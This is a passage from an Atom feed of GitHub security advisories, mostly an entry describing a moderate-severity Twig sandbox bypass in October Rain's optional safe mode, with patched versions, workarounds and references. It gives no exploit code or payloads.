<li>Disable <code>CMS_SAFE_MODE</code> if untrusted template editing is not required</li>
<li>Restrict CMS template editing permissions to fully trusted administrators only</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Reported by Łukasz Rybak</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/octobercms/october/security/advisories/GHSA-m5qg-jc75-4jp6">https://github.com/octobercms/october/security/advisories/GHSA-m5qg-jc75-4jp6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22692">https://nvd.nist.gov/vuln/detail/CVE-2026-22692</a></li>
<li><a href="https://github.com/advisories/GHSA-m5qg-jc75-4jp6">https://github.com/advisories/GHSA-m5qg-jc75-4jp6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5qg-jc75-4jp6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T20:02:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[october/rain] October Rain has a Twig Sandbox Bypass via Collection Methods]]></title>
        <id>https://github.com/advisories/GHSA-m5qg-jc75-4jp6</id>
        <link href="https://github.com/advisories/GHSA-m5qg-jc75-4jp6"/>
        <updated>2026-04-14T20:02:06.000Z</updated>
        <content type="html"><![CDATA[<p>A sandbox bypass vulnerability was identified in the optional Twig safe mode feature (<code>CMS_SAFE_MODE</code>). Certain methods on the <code>collect()</code> helper were not properly restricted, allowing authenticated users with template editing permissions to bypass sandbox protections.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Bypass of Twig sandbox restrictions</li>
<li>Only affects installations with <code>CMS_SAFE_MODE</code> enabled (disabled by default)</li>
<li>Requires authenticated backend access with CMS template editing permissions</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in v4.1.5 and v3.7.13. All users who have enabled safe mode are encouraged to upgrade to the latest patched version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible:</p>
<ul>
<li>Disable <code>CMS_SAFE_MODE</code> if untrusted template editing is not required</li>
<li>Restrict CMS template editing permissions to fully trusted administrators only</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Reported by Łukasz Rybak</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/octobercms/october/security/advisories/GHSA-m5qg-jc75-4jp6">https://github.com/octobercms/october/security/advisories/GHSA-m5qg-jc75-4jp6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22692">https://nvd.nist.gov/vuln/detail/CVE-2026-22692</a></li>
<li><a href="https://github.com/advisories/GHSA-m5qg-jc75-4jp6">https://github.com/advisories/GHSA-m5qg-jc75-4jp6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5qg-jc75-4jp6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T20:02:05.000Z</published>
    </entry>
</feed>